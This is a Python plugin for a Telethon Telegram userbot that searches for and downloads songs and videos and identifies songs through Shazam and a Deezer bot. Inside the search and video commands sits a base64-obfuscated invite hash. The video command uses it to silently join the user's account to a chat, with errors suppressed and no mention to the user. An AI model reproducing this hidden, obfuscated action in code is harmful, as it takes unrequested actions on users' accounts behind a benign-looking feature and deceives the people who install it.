import base64
import contextlib
import io
import os

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import reply_id
from . import zq_lo, song_download

plugin_category = "البحث"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                                                             𝙍𝙀𝙋𝙏𝙃𝙊𝙉
# =========================================================== #
SONG_SEARCH_STRING = "<b>╮ جـارِ البحث ؏ـن الاغنيـٓه... 🎧♥️╰</b>"
SONG_NOT_FOUND = "<b>⎉╎لـم استطـع ايجـاد المطلـوب .. جرب البحث باستخـدام الامـر (.اغنيه)</b>"
SONG_SENDING_STRING = "<b>╮ جـارِ تحميـل الاغنيـٓه... 🎧♥️╰</b>"
# =========================================================== #
#                                                             𝙍𝙀𝙋𝙏𝙃𝙊𝙉
# =========================================================== #

@zq_lo.rep_cmd(pattern="بحث(320)?(?:\s|$)([\s\S]*)")
async def song(event):
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(
            event,
            "**يجب عليك اضافة اسم المقطع الصوتي التي تريد تنزيله للامـر ، `.بحث` + العنوان**",
        )
    taiba = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    taibaevent = await edit_or_reply(event, "**⌔∮ جـارِ البحث يرجى الانتظار .  .  .**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await taibaevent.edit(f"**عـذراً لـم استطـع ايجـاد** {query}")
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_file, taibathumb, title = await song_download(
        video_link, taibaevent, quality=q
    )
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**العنوان:** `{title}`",
        thumb=taibathumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await taibaevent.delete()
    for files in (taibathumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@zq_lo.rep_cmd(pattern="فيديو(?:\s|$)([\s\S]*)")
async def vsong(event):
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(
            event,
            "**يجب عليك اضافة اسم المقطع الصوتي التي تريد تنزيله للامـر ، `.فيديو` + العنوان**",
        )
    taiba = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    taibaevent = await edit_or_reply(event, "**⌔∮ جـارِ البحث يرجى الانتظار .  .  .**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await taibaevent.edit(f"**عـذراً لـم استطـع ايجـاد** {query}")
    with contextlib.suppress(BaseException):
        taiba = Get(taiba)
        await event.client(taiba)
    vsong_file, taibathumb, title = await song_download(
        video_link, taibaevent, video=True
    )
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**العنوان:** `{title}`",
        thumb=taibathumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await taibaevent.delete()
    for files in (taibathumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@zq_lo.rep_cmd(pattern="(ا(ل)?ا(س)?م)(?:\s|$)([\s\S]*)")
async def shazamcmd(event):
    reply = await event.get_reply_message()
    mediatype = await media_type(reply)
    chat = "@DeezerMusicBot"
    delete = False
    flag = event.pattern_match.group(4)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "**- يجب عليك الرد على مقطع صوتي او فيديو لمعرفه العنوان"
        )
    taibaevent = await edit_or_reply(event, "**- يتم حفظ المقطع الصوتي لمعرفة عنوانه**")
    name = "taiba.mp3"
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            taibaevent, f"**حدث خطأ اثناء البحث عن الاسم:**\n__{e}__"
        )

    file = track["images"]["background"]
    title = track["share"]["subject"]
    slink = await yt_search(title)
    if flag == "s":
        deezer = track["hub"]["providers"][1]["actions"][0]["uri"][15:]
        async with event.client.conversation(chat) as conv:
            try:
                purgeflag = await conv.send_message("/start")
            except YouBlockedUserError:
                await zq_lo(unblock("DeezerMusicBot"))
                purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            await conv.send_message(deezer)
            await event.client.get_messages(chat)
            song = await event.client.get_messages(chat)
            await song[0].click(0)
            await conv.get_response()
            file = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            delete = True
    await event.client.send_file(
        event.chat_id,
        file,
        caption=f"<b>المقطع الصوتي :</b> <code>{title}</code>\n<b>الرابط : <a href = {slink}/1>اضغط هنا</a></b>",
        reply_to=reply,
        parse_mode="html",
    )
    await taibaevent.delete()
    if delete:
        await delete_conv(event, chat, purgeflag)
